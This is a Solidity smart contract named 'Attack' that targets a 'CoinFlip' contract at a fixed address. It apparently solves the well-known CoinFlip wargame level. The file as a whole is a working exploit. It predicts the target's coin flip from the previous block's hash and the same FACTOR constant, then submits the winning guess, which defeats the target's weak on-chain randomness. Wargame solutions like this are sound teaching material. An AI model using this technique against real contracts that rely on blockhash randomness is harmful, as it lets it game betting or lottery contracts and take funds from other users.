// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";


interface CoinFlip {
    function consecutiveWins() external view returns(uint256);
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    using SafeMath for uint256;

    CoinFlip constant private target = CoinFlip(0xed1c7473A164Ff3C40Ff344d0cb4C222f2fdCC7C);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }

    function getConsecutiveWins() public view returns (uint256){
        return target.consecutiveWins();
    }
}